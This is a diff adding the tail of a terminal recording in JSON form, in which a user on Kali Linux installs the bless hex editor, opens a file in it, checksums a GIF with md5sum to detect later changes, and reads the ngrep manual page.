+      "Setting up libmono-system4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000075,
+      "\r\n"
+    ],
+    [
+      0.004387,
+      "Setting up libglib2.0-cil (2.12.10-5) ..."
+    ],
+    [
+      0.000068,
+      "\r\n"
+    ],
+    [
+      0.532277,
+      "* Installing 1 assembly from libglib2.0-cil into Mono\r\n"
+    ],
+    [
+      0.126993,
+      "Setting up libmono-system-drawing4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000087,
+      "\r\n"
+    ],
+    [
+      0.006667,
+      "Setting up libgtk2.0-cil (2.12.10-5) ..."
+    ],
+    [
+      0.000061,
+      "\r\n"
+    ],
+    [
+      2.602859,
+      "* Installing 5 assemblies from libgtk2.0-cil into Mono\r\n"
+    ],
+    [
+      0.557949,
+      "Setting up libglade2.0-cil (2.12.10-5) ..."
+    ],
+    [
+      0.000077,
+      "\r\n"
+    ],
+    [
+      0.532740,
+      "* Installing 1 assembly from libglade2.0-cil into Mono\r\n"
+    ],
+    [
+      0.128706,
+      "Setting up libmono-posix4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000076,
+      "\r\n"
+    ],
+    [
+      0.007658,
+      "Setting up bless (0.6.0-4) ..."
+    ],
+    [
+      0.000067,
+      "\r\n"
+    ],
+    [
+      11.372272,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.016619,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      7.552170,
+      "b"
+    ],
+    [
+      0.103695,
+      "\u0008bl"
+    ],
+    [
+      0.079799,
+      "e"
+    ],
+    [
+      0.048146,
+      "s"
+    ],
+    [
+      0.192020,
+      "s"
+    ],
+    [
+      0.144072,
+      " "
+    ],
+    [
+      0.215962,
+      "o"
+    ],
+    [
+      0.064199,
+      "u"
+    ],
+    [
+      0.046168,
+      "tput.out\u001b[1m \u001b[0m"
+    ],
+    [
+      0.474928,
+      "\u0008\u001b[0m \u0008\r\r\n"
+    ],
+    [
+      0.353132,
+      "Could not find file \"/home/miles/.config/bless/preferences.xml\"."
+    ],
+    [
+      0.000650,
+      "\r\n"
+    ],
+    [
+      0.036172,
+      "Directory '/home/miles/.config/bless/plugins' not found."
+    ],
+    [
+      0.000327,
+      "\r\n"
+    ],
+    [
+      0.010677,
+      "Directory '/home/miles/.config/bless/plugins' not found."
+    ],
+    [
+      0.000067,
+      "\r\n"
+    ],
+    [
+      0.077432,
+      "Directory '/home/miles/.config/bless/plugins' not found."
+    ],
+    [
+      0.000089,
+      "\r\n"
+    ],
+    [
+      0.007319,
+      "Could not find file \"/home/miles/.config/bless/export_patterns\"."
+    ],
+    [
+      0.000071,
+      "\r\n"
+    ],
+    [
+      0.051907,
+      "Could not find file \"/home/miles/.config/bless/history.xml\"."
+    ],
+    [
+      0.000061,
+      "\r\n"
+    ],
+    [
+      59.116287,
+      "^C"
+    ],
+    [
+      0.005237,
+      "\r\n\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.011421,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      2.291711,
+      "g"
+    ],
+    [
+      0.071847,
+      "\u0008gn"
+    ],
+    [
+      0.095962,
+      "o"
+    ],
+    [
+      0.135948,
+      "m"
+    ],
+    [
+      0.136285,
+      "e"
+    ],
+    [
+      0.191877,
+      "-"
+    ],
+    [
+      0.280045,
+      "o"
+    ],
+    [
+      0.080113,
+      "p"
+    ],
+    [
+      0.135835,
+      "e"
+    ],
+    [
+      0.072061,
+      "n"
+    ],
+    [
+      1.808120,
+      " "
+    ],
+    [
+      0.423795,
+      "o"
+    ],
+    [
+      0.056102,
+      "u"
+    ],
+    [
+      0.061213,
+      "t"
+    ],
+    [
+      0.506906,
+      "."
+    ],
+    [
+      0.351928,
+      "i"
+    ],
+    [
+      0.392068,
+      "\u0008 \u0008"
+    ],
+    [
+      0.103972,
+      "g"
+    ],
+    [
+      0.112458,
+      "i"
+    ],
+    [
+      0.103428,
+      "f"
+    ],
+    [
+      0.120190,
+      "\r\r\n"
+    ],
+    [
+      0.047796,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.008661,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      2.927749,
+      "m"
+    ],
+    [
+      0.087951,
+      "\u0008md"
+    ],
+    [
+      0.703249,
+      "5"
+    ],
+    [
+      0.200234,
+      "s"
+    ],
+    [
+      0.064482,
+      "u"
+    ],
+    [
+      0.160689,
+      "m"
+    ],
+    [
+      0.471509,
+      " "
+    ],
+    [
+      0.312086,
+      "o"
+    ],
+    [
+      0.128026,
+      "u"
+    ],
+    [
+      0.064120,
+      "t"
+    ],
+    [
+      0.783798,
+      "."
+    ],
+    [
+      0.207968,
+      "g"
+    ],
+    [
+      0.072106,
+      "i"
+    ],
+    [
+      0.135893,
+      "f"
+    ],
+    [
+      0.192796,
+      "\r\r\n"
+    ],
+    [
+      0.003719,
+      "df3e567d6f16d040326c7a0ea29a4f41  out.gif"
+    ],
+    [
+      0.000123,
+      "\r\n"
+    ],
+    [
+      0.000420,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001009,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      4.033895,
+      "#"
+    ],
+    [
+      0.200206,
+      "\u0008# "
+    ],
+    [
+      0.263935,
+      "t"
+    ],
+    [
+      0.064125,
+      "h"
+    ],
+    [
+      0.048295,
+      "i"
+    ],
+    [
+      0.095782,
+      "s"
+    ],
+    [
+      0.095756,
+      " "
+    ],
+    [
+      0.400044,
+      "w"
+    ],
+    [
+      0.112239,
+      "a"
+    ],
+    [
+      0.095981,
+      "s"
+    ],
+    [
+      0.160025,
+      " "
+    ],
+    [
+      0.247875,
+      "t"
+    ],
+    [
+      0.056023,
+      "o"
+    ],
+    [
+      0.056341,
+      " "
+    ],
+    [
+      0.431783,
+      "m"
+    ],
+    [
+      0.087982,
+      "a"
+    ],
+    [
+      0.055826,
+      "k"
+    ],
+    [
+      0.184058,
+      "e"
+    ],
+    [
+      0.160038,
+      " "
+    ],
+    [
+      0.360154,
+      "s"
+    ],
+    [
+      0.087802,
+      "r"
+    ],
+    [
+      0.024040,
+      "u"
+    ],
+    [
+      0.328172,
+      "e"
+    ],
+    [
+      0.279910,
+      "\u0008 \u0008"
+    ],
+    [
+      0.120058,
+      "\u0008 \u0008"
+    ],
+    [
+      0.135860,
+      "\u0008 \u0008"
+    ],
+    [
+      0.208190,
+      "u"
+    ],
+    [
+      0.104147,
+      "r"
+    ],
+    [
+      0.039665,
+      "e"
+    ],
+    [
+      0.112413,
+      " "
+    ],
+    [
+      0.167721,
+      "w"
+    ],
+    [
+      0.144319,
+      "h"
+    ],
+    [
+      0.199953,
+      "a"
+    ],
+    [
+      0.111909,
+      "t"
+    ],
+    [
+      0.127935,
+      " "
+    ],
+    [
+      0.359906,
+      "w"
+    ],
+    [
+      0.103957,
+      "e"
+    ],
+    [
+      0.096000,
+      " "
+    ],
+    [
+      0.176176,
+      "f"
+    ],
+    [
+      0.111838,
+      "o"
+    ],
+    [
+      0.040388,
+      "u"
+    ],
+    [
+      0.175814,
+      "n"
+    ],
+    [
+      0.119752,
+      "d"
+    ],
+    [
+      0.128192,
+      " "
+    ],
+    [
+      5.227293,
+      "\u0008"
+    ],
+    [
+      0.500947,
+      "\u0008 \u0008"
+    ],
+    [
+      0.030531,
+      "\u0008 \u0008"
+    ],
+    [
+      0.031189,
+      "\u0008 \u0008"
+    ],
+    [
+      0.030486,
+      "\u0008 \u0008"
+    ],
+    [
+      0.031049,
+      "\u0008 \u0008"
+    ],
+    [
+      0.030461,
+      "\u0008"
+    ],
+    [
+      0.030246,
+      "\u0008 \u0008"
+    ],
+    [
+      0.029788,
+      "\u0008 \u0008"
+    ],
+    [
+      0.031574,
+      "\u0008"
+    ],
+    [
+      0.030085,
+      "\u0008 \u0008"
+    ],
+    [
+      0.030861,
+      "\u0008 \u0008"
+    ],
+    [
+      0.030921,
+      "\u0008 \u0008"
+    ],
+    [
+      0.030173,
+      "\u0008 \u0008"
+    ],
+    [
+      0.731452,
+      "i"
+    ],
+    [
+      0.072554,
+      "f"
+    ],
+    [
+      0.119651,
+      " "
+    ],
+    [
+      0.714851,
+      "i"
+    ],
+    [
+      0.117200,
+      "t"
+    ],
+    [
+      0.143914,
+      " "
+    ],
+    [
+      0.103972,
+      "w"
+    ],
+    [
+      0.160018,
+      "a"
+    ],
+    [
+      0.056081,
+      "s"
+    ],
+    [
+      0.128160,
+      " "
+    ],
+    [
+      0.111599,
+      "s"
+    ],
+    [
+      0.384407,
+      "\u0008 \u0008"
+    ],
+    [
+      0.144156,
+      "c"
+    ],
+    [
+      0.095729,
+      "h"
+    ],
+    [
+      0.127811,
+      "a"
+    ],
+    [
+      0.056497,
+      "n"
+    ],
+    [
+      0.191688,
+      "g"
+    ],
+    [
+      0.152011,
+      "e"
+    ],
+    [
+      0.247986,
+      "d"
+    ],
+    [
+      0.120205,
+      " "
+    ],
+    [
+      0.095933,
+      "l"
+    ],
+    [
+      0.111836,
+      "a"
+    ],
+    [
+      0.103764,
+      "t"
+    ],
+    [
+      0.112494,
+      "e"
+    ],
+    [
+      0.087716,
+      "r"
+    ],
+    [
+      0.184249,
+      ","
+    ],
+    [
+      0.056666,
+      " "
+    ],
+    [
+      0.183199,
+      "w"
+    ],
+    [
+      0.127764,
+      "e"
+    ],
+    [
+      0.160192,
+      " "
+    ],
+    [
+      0.192107,
+      "k"
+    ],
+    [
+      0.296087,
+      "\u0008 \u0008"
+    ],
+    [
+      0.063868,
+      "c"
+    ],
+    [
+      0.128016,
+      "a"
+    ],
+    [
+      0.048496,
+      "n"
+    ],
+    [
+      0.095702,
+      " "
+    ],
+    [
+      0.143897,
+      "k"
+    ],
+    [
+      0.127925,
+      "n"
+    ],
+    [
+      0.072324,
+      "o"
+    ],
+    [
+      0.102867,
+      "w"
+    ],
+    [
+      0.096696,
+      " "
+    ],
+    [
+      0.072263,
+      "i"
+    ],
+    [
+      0.152095,
+      "t"
+    ],
+    [
+      0.383955,
+      " "
+    ],
+    [
+      0.215211,
+      "w"
+    ],
+    [
+      0.112540,
+      "a"
+    ],
+    [
+      0.136166,
+      "s"
+    ],
+    [
+      0.071965,
+      " "
+    ],
+    [
+      0.232168,
+      "c"
+    ],
+    [
+      0.088063,
+      "h"
+    ],
+    [
+      0.087984,
+      "a"
+    ],
+    [
+      0.119864,
+      "n"
+    ],
+    [
+      0.039853,
+      "g"
+    ],
+    [
+      0.088109,
+      "e"
+    ],
+    [
+      0.199900,
+      "d"
+    ],
+    [
+      0.089298,
+      "\r\r\n"
+    ],
+    [
+      0.001277,
+      "zsh: command not found: #"
+    ],
+    [
+      0.000051,
+      "\r\n"
+    ],
+    [
+      0.000430,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001068,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      275.528064,
+      "m"
+    ],
+    [
+      0.181037,
+      "\u0008ma"
+    ],
+    [
+      0.031518,
+      "n"
+    ],
+    [
+      0.312331,
+      " "
+    ],
+    [
+      0.247989,
+      "n"
+    ],
+    [
+      0.239764,
+      "g"
+    ],
+    [
+      0.192371,
+      "r"
+    ],
+    [
+      0.063850,
+      "e"
+    ],
+    [
+      0.111931,
+      "p"
+    ],
+    [
+      0.280348,
+      "\r\r\n"
+    ],
+    [
+      0.116007,
+      "\u001b[?1049h\u001b[?1h\u001b=\r"
+    ],
+    [
+      0.112829,
+      "\u001b[m\r\nNGREP(8)                                                      User Manuals                                                      NGREP(8)\u001b[m\r\n\u001b[m\r\n\u001b[1mNAME\u001b[0m\u001b[m\r\n       ngrep - network grep\u001b[m\r\n\u001b[m\r\n\u001b[1mSYNOPSIS\u001b[0m\u001b[m\r\n       \u001b[1mngrep\u001b[0m  \u001b[1m\u003c-hNXViwqpevxlDtTRM\u003e\u001b[0m  \u001b[1m\u003c-IO\u001b[0m  \u001b[4mpcap_dump\u001b[24m  \u001b[1m\u003e\u001b[0m  \u001b[1m\u003c\u001b[0m  \u001b[1m-n\u001b[0m  \u001b[4mnum\u001b[24m  \u001b[1m\u003e\u001b[0m  \u001b[1m\u003c\u001b[0m  \u001b[1m-d\u001b[0m  \u001b[4mdev\u001b[24m  \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[1m-A\u001b[0m \u001b[4mnum\u001b[24m \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[1m-s\u001b[0m \u001b[4msnaplen\u001b[24m \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[1m-S\u001b[0m \u001b[4mlimitlen\u001b[24m \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[1m-W\u001b[0m \u001b[4mnor‐\u001b[24m\u001b[m\r\n       \u001b[4mmal|byline|single|none\u001b[24m \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[1m-c\u001b[0m \u001b[4mcols\u001b[24m \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[1m-P\u001b[0m \u001b[4mchar\u001b[24m \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[1m-F\u001b[0m \u001b[4mfile\u001b[24m \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[4mmatch\u001b[24m \u001b[4mexpression\u001b[24m \u001b[1m\u003e\u001b[0m \u001b[1m\u003c\u001b[0m \u001b[4mbpf\u001b[24m \u001b[4mfilter\u001b[24m \u001b[1m\u003e\u001b[0m\u001b[m\r\n\u001b[m\r\n\u001b[1mDESCRIPTION\u001b[0m\u001b[m\r\n       ngrep strives to provide most of GNU grep's common features, applying them to the network layer.  ngrep is a pcap-aware tool that\u001b[m\r\n       will  allow  you to specify extended regular expressions to match against data payloads of packets.  It currently recognizes TCP,\u001b[m\r\n       UDP and ICMP across Ethernet, PPP, SLIP, FDDI and null interfaces, and understands bpf filter logic in the same fashion  as  more\u001b[m\r\n       common packet sniffing tools, such as \u001b[1mtcpdump\u001b[0m(8) and \u001b[1msnoop\u001b[0m(1).\u001b[m\r\n\u001b[m\r\n\u001b[1mOPTIONS\u001b[0m\u001b[m\r\n       -h     Display help/usage information.\u001b[m\r\n\u001b[m\r\n       -N     Show sub-protocol number along with single-character identifier (useful when observing raw or unknown protocols).\u001b[m\r\n\u001b[m\r\n       -X     Treat the match expression as a hexadecimal string.  See the explanation of \u001b[4mmatch\u001b[24m \u001b[4mexpression\u001b[24m below.\u001b[m\r\n\u001b[m\r\n       -V     Display version information.\u001b[m\r\n\u001b[m\r\n       -i     Ignore case for the regex expression.\u001b[m\r\n\u001b[m\r\n       -w     Match the regex expression as a word.\u001b[m\r\n\u001b[m\r\n       -q     Be quiet; don't output any information other than packet headers and their payloads (if relevant).\u001b[m\r\n\u001b[m\r\n       -p     Don't put the interface into promiscuous mode.\u001b[m\r\n\u001b[m\r\n       -e     Show  empty  packets.   Normally  empty packets are discarded because they have no payload to search.  If specified, empty\u001b[m\r\n              packets will be shown, regardless of the specified regex expression.\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 1 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      9.609085,
+      "\r\u001b[K\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 2 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      4.215736,
+      "\r\u001b[K       -v     Invert the match; only display packets that don't match.\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 3 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.103839,
+      "\r\u001b[K\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 6 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.296106,
+      "\r\u001b[K       -x     Dump packet contents as hexadecimal as well as ASCII.\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 7 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.167490,
+      "\r\u001b[K\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 8 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.336686,
+      "\r\u001b[K       -l     Make stdout line buffered.\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 10 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.391783,
+      "\r\u001b[K\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 11 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.152127,
+      "\r\u001b[K       -D     When reading pcap_dump files, replay them at their recorded time intervals (mimic realtime).\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 12 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.240048,
+      "\r\u001b[K\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 13 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.311989,
+      "\r\u001b[K       -t     Print a timestamp in the form of YYYY/MM/DD HH:MM:SS.UUUUUU everytime a packet is matched.\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 15 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.135948,
+      "\r\u001b[K\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 16 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.200174,
+      "\r\u001b[K       -T     Print a timestamp in the form of +S.UUUUUU, indicating the delta between packet matches.\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 17 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.239912,
+      "\r\u001b[K\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 18 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.391994,
+      "\r\u001b[K       -R     Do not try to drop privileges to the DROPPRIVS_USER.\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 19 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.367790,
+      "\r\u001b[K\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 20 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.184330,
+      "\r\u001b[K              ngrep makes no effort to validate input from live or offline sources as it is focused more  on  performance  and  handling\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 23 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.239950,
+      "\r\u001b[K              large  amounts  of  data  than protocol correctness, which is most often a fair assumption to make.  However, sometimes it\u001b[m\r\n\u001b[7m Manual page ngrep(8) line 24 (press h for help or q to quit)\u001b[27m\u001b[K"
+    ],
+    [
+      0.769483,
+      "\r\u001b[K\u001b[?1l\u001b\u003e\u001b[?1049l"
+    ],
+    [
+      0.000452,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.009640,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m"
+    ],
+    [
+      0.000129,
+      "\u001b[K"
+    ],
+    [
+      2243.052403,
+      "e"
+    ],
+    [
+      0.214068,
+      "\u0008ex"
+    ],
+    [
+      0.099492,
+      "i"
+    ],
+    [
+      0.168678,
+      "t"
+    ],
+    [
+      0.155130,
+      "\r\r\n"
+    ]
+  ]
+}
